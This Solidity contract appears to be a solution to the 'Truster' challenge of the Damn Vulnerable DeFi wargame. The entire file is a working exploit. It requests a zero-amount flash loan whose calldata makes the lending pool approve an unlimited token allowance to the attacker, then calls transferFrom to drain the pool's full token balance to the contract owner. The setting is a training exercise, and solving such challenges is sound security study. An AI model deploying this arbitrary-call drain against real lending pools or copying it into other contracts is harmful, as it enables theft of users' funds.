// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";

contract TrusterAttacker {
    TrusterLenderPool public immutable si_pool;
    DamnValuableToken public immutable si_token;
    address public immutable si_owner;

    constructor(TrusterLenderPool _pool) {
        si_pool = _pool;
        si_token = _pool.token();
        si_owner = msg.sender;
    }

    function attack() public {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)", address(this), type(uint256).max
        );

        si_pool.flashLoan(0, msg.sender, address(si_token), data);

        // Transfer all tokens from the pool to the attacker
        si_token.transferFrom(address(si_pool), si_owner, si_token.balanceOf(address(si_pool)));
    }

    receive() external payable {
    }
}